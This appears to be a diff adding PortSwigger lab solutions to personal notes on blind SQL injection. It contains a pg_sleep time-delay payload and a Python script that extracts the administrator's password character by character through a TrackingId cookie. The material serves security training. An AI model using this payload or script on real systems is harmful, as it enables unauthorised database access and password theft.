@@ -161,9 +161,41 @@ for j in range(1,21):
 
     https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
 
+Payload:
+
+    ;SELECT+pg_sleep(10)--
+
 ### Lab: Blind SQL injection with time delays and information retrieval
 
     https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
+Solution:
+
+```
+#!/usr/bin/python3
+
+# (https://docs.python-requests.org/en/latest/)
+import requests
+from requests import get
+import sys
+import datetime
+
+s = requests.session()
+
+for j in range(1,21):
+    for i in range(48,122):
+
+        payload = "'%3b SELECT CASE WHEN (ASCII(SUBSTRING(Password, "+str(j)+","+str(j)+")) = "+str(i)+") THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+        cookie = dict(TrackingId=payload)
+        start = datetime.datetime.now()
+        r = s.get("https://0a6e00a603ca30c5c0067c0a00470033.web-security-academy.net/filter?category=Gifts", cookies=cookie, timeout=8)
+        stop = datetime.datetime.now()
+        elapsed = stop - start
+
+        if elapsed > datetime.timedelta(seconds=7):
+            print(chr(i))
+            break
+```
 
 ### Lab: Blind SQL injection with out-of-band interaction
 
